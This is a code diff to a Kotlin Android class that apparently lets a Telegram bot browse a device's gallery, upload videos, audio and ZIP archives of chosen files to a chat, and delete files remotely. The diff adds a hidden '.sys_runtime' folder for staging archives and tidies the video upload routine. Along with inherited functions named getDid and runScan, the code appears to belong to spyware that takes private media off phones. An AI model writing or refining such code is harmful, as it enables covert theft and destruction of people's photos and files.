@@ -28,7 +28,8 @@ import java.util.zip.ZipOutputStream
  * ✅ تم إصلاح تحديث لوحة المفاتيح عبر تخزين آخر message_id لكل دردشة.
  * ✅ تم دعم جميع الأوامر الجديدة (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
  * ✅ تم إضافة مسح الكاش بعد عمليات التغيير.
- * ✅ تم تحسين معالجة الفيديو مع إشعار التحميل وتحديث messageId.
+ * ✅ تم تحسين معالجة الفيديو بإعادة ترتيب تحديث lastMessageIdMap واستخدام try-finally لحذف الصورة المصغرة.
+ * ✅ تم تغيير مسار إنشاء ملفات ZIP المؤقتة إلى مجلد مخصص داخل .sys_runtime بدلاً من cacheDir.
  * ✅ تم دعم الأمر del القديم للتوافق مع الإصدارات السابقة.
  * ✅ تم جعل الدوال الموروثة (getGalleryByCategory, getDid, runScan, getPendingCount) مفتوحة (open) للسماح بالوراثة.
  */
@@ -42,6 +43,14 @@ open class GalleryBrowser(
 
     private val pageSize = 6
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    // ========== المسارات والمجلدات ==========
+    // ✅ إضافة مجلد التشغيل الرئيسي لاستخدامه في تخزين الملفات المؤقتة
+    private val runtimeDir: File by lazy {
+        File(appContext?.filesDir, ".sys_runtime").apply {
+            if (!exists()) mkdirs()
+        }
+    }
 
     // ذاكرة مؤقتة للقائمة مع وقت انتهاء الصلاحية
     private var cachedFiles: List<Map<String, Any>>? = null
@@ -374,25 +383,34 @@ open class GalleryBrowser(
                     "chat_id" to chatId,
                     "action" to "upload_video"
                 ))
+                // ✅ الإصلاح 1: إعادة ترتيب تنفيذ معالجة الفيديو
+                // استخدام try-finally لضمان حذف الصورة المصغرة بعد تحديث lastMessageIdMap
                 scope.launch {
-                    val thumbnail = generateVideoThumbnail(file, -1)
-                    val response = if (thumbnail != null) {
-                        invokeTelegramMethod(telegram, "sendVideo", mapOf(
-                            "chat_id" to chatId,
-                            "caption" to "🎬 ${file.name}",
-                            "reply_markup" to jsonKb,
-                            "supports_streaming" to true
-                        ), mapOf("video" to file, "thumb" to thumbnail))
-                    } else {
-                        invokeTelegramMethod(telegram, "sendVideo", mapOf(
-                            "chat_id" to chatId,
-                            "caption" to "🎬 ${file.name}",
-                            "reply_markup" to jsonKb,
-                            "supports_streaming" to true
-                        ), mapOf("video" to file))
+                    var response: Any? = null
+                    var thumbnail: File? = null
+                    try {
+                        thumbnail = generateVideoThumbnail(file, -1)
+                        response = if (thumbnail != null) {
+                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
+                                "chat_id" to chatId,
+                                "caption" to "🎬 ${file.name}",
+                                "reply_markup" to jsonKb,
+                                "supports_streaming" to true
+                            ), mapOf("video" to file, "thumb" to thumbnail))
+                        } else {
+                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
+                                "chat_id" to chatId,
+                                "caption" to "🎬 ${file.name}",
+                                "reply_markup" to jsonKb,
+                                "supports_streaming" to true
+                            ), mapOf("video" to file))
+                        }
+                        // تحديث lastMessageIdMap بعد نجاح الإرسال
+                        updateLastMessageIdFromResponse(chatId, response)
+                    } finally {
+                        // حذف الصورة المصغرة في النهاية حتى في حالة حدوث استثناء
+                        thumbnail?.delete()
                     }
-                    updateLastMessageIdFromResponse(chatId, response)
-                    thumbnail?.delete()
                 }
             }
             "audio" -> {
@@ -656,12 +674,20 @@ open class GalleryBrowser(
 
     // ============================================================
     //  إنشاء أرشيف ZIP للملفات المحددة
+    // ✅ الإصلاح 2: استخدام مجلد مخصص داخل .sys_runtime بدلاً من cacheDir
     // ============================================================
 
     private fun createZipArchive(files: List<File>): File? {
         if (files.isEmpty()) return null
         val ctx = appContext ?: return null
-        val zipFile = File(ctx.cacheDir, "archive_${System.currentTimeMillis()}.zip")
+
+        // ✅ إنشاء مجلد مؤقت داخل .sys_runtime لضمان توفر مساحة كافية
+        val tempDir = File(runtimeDir, "temp_archives")
+        if (!tempDir.exists()) {
+            tempDir.mkdirs()
+        }
+
+        val zipFile = File(tempDir, "archive_${System.currentTimeMillis()}.zip")
         return try {
             ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                 val buffer = ByteArray(8192)
